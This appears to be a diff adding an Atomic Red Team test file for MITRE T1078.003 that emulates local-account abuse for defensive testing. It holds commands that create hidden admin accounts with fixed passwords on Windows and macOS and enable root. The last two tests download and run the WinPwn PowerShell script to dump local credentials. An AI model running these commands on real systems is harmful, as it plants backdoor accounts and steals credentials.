@@ -1,0 +1,121 @@
+atomic_tests:
+- auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
+  description: After execution the new account will be active and added to the Administrators
+    group
+  executor:
+    cleanup_command: 'net localgroup #{admin_group} #{username} /delete >nul 2>&1
+
+      net user #{username} /delete >nul 2>&1'
+    command: 'net user #{username} /add
+
+      net user #{username} #{password}
+
+      net localgroup #{admin_group} #{username} /add'
+    elevation_required: true
+    name: command_prompt
+  input_arguments:
+    admin_group:
+      default: administrateurs
+      description: group administrators
+      type: string
+    password:
+      default: hacker2
+      description: Password for user
+      type: string
+    username:
+      default: hacker2
+      description: username
+      type: string
+  name: Create local account with admin privileges
+  supported_platforms:
+  - windows
+- auto_generated_guid: f1275566-1c26-4b66-83e3-7f9f7f964daa
+  description: After execution the new account will be active and added to the Administrators
+    group
+  executor:
+    cleanup_command: sudo dscl . -delete /Users/AtomicUser
+    command: 'dscl . -create /Users/AtomicUser
+
+      dscl . -create /Users/AtomicUser UserShell /bin/bash
+
+      dscl . -create /Users/AtomicUser RealName "Atomic User"
+
+      dscl . -create /Users/AtomicUser UniqueID 503
+
+      dscl . -create /Users/AtomicUser PrimaryGroupID 503
+
+      dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser
+
+      dscl . -passwd /Users/AtomicUser mySecretPassword
+
+      dscl . -append /Groups/admin GroupMembership AtomicUser'
+    elevation_required: true
+    name: bash
+  name: Create local account with admin privileges - MacOS
+  supported_platforms:
+  - macos
+- auto_generated_guid: 191db57d-091a-47d5-99f3-97fde53de505
+  description: After execution the new account will be active and added to the Administrators
+    group
+  executor:
+    cleanup_command: sysadminctl interactive -deleteUser art-tester
+    command: sysadminctl interactive -addUser art-tester -fullName ARTUser -password
+      !pass123! -admin
+    elevation_required: true
+    name: bash
+  name: Create local account with admin privileges using sysadminctl utility - MacOS
+  supported_platforms:
+  - macos
+- auto_generated_guid: 20b40ea9-0e17-4155-b8e6-244911a678ac
+  description: After execution the current/new user will have root access
+  executor:
+    cleanup_command: 'dsenableroot -d #current user
+
+      dsenableroot -d -u art-tester -p art-tester #new user'
+    command: 'dsenableroot #current user
+
+      dsenableroot -u art-tester -p art-tester -r art-root #new user'
+    elevation_required: true
+    name: bash
+  name: Enable root account using dsenableroot utility - MacOS
+  supported_platforms:
+  - macos
+- auto_generated_guid: 433842ba-e796-4fd5-a14f-95d3a1970875
+  description: After execution the current/new user will be added to the Admin group
+  executor:
+    cleanup_command: dseditgroup -o edit -d art-user -t user admin
+    command: dseditgroup -o edit -a art-user -t user admin
+    elevation_required: true
+    name: bash
+  name: Add a new/existing user to the admin group using dseditgroup utility - macOS
+  supported_platforms:
+  - macos
+- auto_generated_guid: 9e9fd066-453d-442f-88c1-ad7911d32912
+  description: Loot local Credentials - powerhell kittie technique via function of
+    WinPwn
+  executor:
+    command: '$S3cur3Th1sSh1t_repo=''https://raw.githubusercontent.com/S3cur3Th1sSh1t''
+
+      iex(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'')
+
+      obfuskittiedump -consoleoutput -noninteractive'
+    elevation_required: true
+    name: powershell
+  name: WinPwn - Loot local Credentials - powerhell kittie
+  supported_platforms:
+  - windows
+- auto_generated_guid: e9fdb899-a980-4ba4-934b-486ad22e22f4
+  description: Loot local Credentials - Safetykatz technique via function of WinPwn
+  executor:
+    command: '$S3cur3Th1sSh1t_repo=''https://raw.githubusercontent.com/S3cur3Th1sSh1t''
+
+      iex(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'')
+
+      safedump -consoleoutput -noninteractive'
+    elevation_required: true
+    name: powershell
+  name: WinPwn - Loot local Credentials - Safetykatz
+  supported_platforms:
+  - windows
+attack_technique: T1078.003
+display_name: 'Valid Accounts: Local Accounts'
